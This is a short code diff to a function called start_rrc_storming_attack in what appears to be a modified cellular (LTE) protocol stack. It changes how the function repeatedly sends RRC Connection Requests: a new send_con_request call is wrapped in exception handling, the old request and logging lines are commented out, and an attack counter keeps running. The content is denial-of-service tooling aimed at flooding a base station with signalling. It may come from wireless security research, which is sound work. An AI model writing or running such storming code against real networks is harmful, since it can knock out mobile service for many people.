@@ -3079,11 +3079,17 @@ void rrc::start_rrc_storming_attack()
         nas_msg->N_bytes = 2;
         
         // Send connection request
-        if (connection_request(cause, std::move(nas_msg))) {
-          logger.info("[RRC_STORM] Connection Request sent successfully");
-        } else {
-          logger.warning("[RRC_STORM] Failed to send Connection Request");
+        try {
+          send_con_request(cause);
         }
+        catch (const std::exception& e) {
+          logger.warning("[RRC_STORM] Exception in sending connection request%s", e.what());
+        }
+       //if (connection_request(cause, std::move(nas_msg))) {
+       //  logger.info("[RRC_STORM] Connection Request sent successfully");
+       //} else {
+       //  logger.warning("[RRC_STORM] Failed to send Connection Request");
+       //}
       }
       
       attack_count++;
